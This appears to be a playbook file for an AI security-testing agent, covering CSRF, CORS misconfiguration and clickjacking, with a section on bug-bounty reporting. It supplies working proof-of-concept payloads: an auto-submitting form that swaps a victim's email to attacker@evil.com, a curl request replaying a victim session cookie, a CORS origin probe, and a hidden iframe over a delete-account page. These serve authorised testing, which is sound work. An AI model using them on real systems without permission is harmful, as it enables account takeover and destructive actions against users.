---
name: csrf
description: CSRF, CORS misconfiguration, and clickjacking playbook. Use when state-changing endpoints lack anti-CSRF tokens, SameSite cookies are absent, JSON/plain CSRF is possible, ACAO reflects Origin with credentials, or sensitive actions are iframe-embeddable.
allowed-tools:
  - shell
  - http
  - coverage
  - confirm_finding
  - file_write
---

# CSRF / CORS / clickjacking playbook

Modern apps hide CSRF behind SameSite cookies and JSON APIs — test both classic form CSRF and cross-origin edge cases.

## 1. Inventory state-changing endpoints
Find POST/PUT/PATCH/DELETE that change:
- Email/password, 2FA settings, API keys
- Payment methods, shipping address
- Role/permissions, team membership
- Delete account, export data

Note whether requests use:
- Cookie session only
- `Authorization: Bearer` (CSRF usually N/A unless cookies also sent)
- Custom header (`X-Requested-With`, `X-CSRF-Token`)

## 2. Classic CSRF probe
If cookie-authenticated form POST without token:

```html
<!-- Save as poc.html locally — user opens while logged in -->
<form action="https://app.example.com/account/email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

Verify with curl using victim session cookie (user provides `SESSION` placeholder):

```sh
curl -ksS -X POST 'https://app.example.com/account/email' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b "$VICTIM_SESSION" \
  --data 'email=attacker@evil.com' -w '\nHTTP %{http_code}\n'
```

## 3. SameSite bypass vectors
- **Lax + top-level GET**: state change via GET? (legacy apps)
- **Cross-site POST with `Content-Type: text/plain`** to JSON endpoint — some parsers accept it
- **Subdomain takeover** on sibling subdomain → cookies with `Domain=.target.com` leak CSRF surface

## 4. CORS misconfiguration
Test reflective Origin with credentials:

```sh
curl -ksS 'https://api.example.com/user/me' \
  -H 'Origin: https://evil.com' \
  -H 'Cookie: session=...' -D - -o /dev/null | grep -i access-control
```

Dangerous combos:
- `Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true`
- `Access-Control-Allow-Origin: null` with credentials (sandbox iframe)
- Wildcard `*` with credentials (invalid per spec but mis-implementations exist)

If CORS allows reading sensitive JSON cross-origin → confirm as high impact with PoC fetch snippet.

## 5. Clickjacking
Check sensitive pages for `X-Frame-Options` / CSP `frame-ancestors`. If missing on password change or payment:

```html
<iframe src="https://app.example.com/settings/delete-account" style="opacity:0">
```

Demonstrate UI redress impact — victim clicks invisible "Confirm delete".

## 6. Report
VRT examples:
- `Cross-Site Request Forgery (CSRF) > CSRF on State-Changing Endpoint`
- `Security Misconfiguration > CORS Misconfiguration`
- `UI Redressing (Clickjacking) > Sensitive Action`

Include minimal HTML/curl PoC and one-line impact. Call `confirm_finding` after manual verification.
